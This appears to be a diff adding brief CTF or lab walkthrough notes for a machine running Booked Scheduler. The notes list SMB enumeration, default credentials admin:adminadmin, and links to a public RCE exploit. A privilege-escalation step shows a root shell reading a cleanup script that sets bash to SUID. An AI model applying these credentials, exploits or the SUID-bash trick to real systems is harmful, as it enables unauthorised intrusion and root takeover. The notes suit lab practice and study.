@@ -1,0 +1,22 @@
+Foothold
+
+smb enumeration, get everything :)
+
+admin:adminadmin
+
+https://www.exploit-db.com/exploits/50594
+
+https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF
+
+
+
+
+
+
+Priv Esc:
+
+bash-5.0# cat /var/www/html/booked/cleanup.py
+cat /var/www/html/booked/cleanup.py
+import os
+os.chmod('/usr/bin/bash', 7777)
+
